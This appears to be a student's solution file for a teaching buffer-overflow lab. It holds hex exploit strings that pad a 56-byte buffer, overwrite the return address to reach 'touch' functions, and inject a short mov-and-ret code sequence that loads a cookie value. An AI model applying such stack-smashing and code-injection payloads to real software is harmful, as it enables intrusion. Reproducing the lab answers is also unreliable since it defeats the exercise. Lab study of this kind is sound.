for touch one
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00// first 56 bytes are just padding
0e 13 40 00 00 00 00 00// the address of touch one written backwards

for touch 2
48 c7 c7 08 4a 2e 2a c3// this is setting my cookie 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00//padding 
f8 fc 65 55 00 00 00 00// ad
3a 13 40 00 00 00 00 00
08 94 e2 2a 00 00 00 00
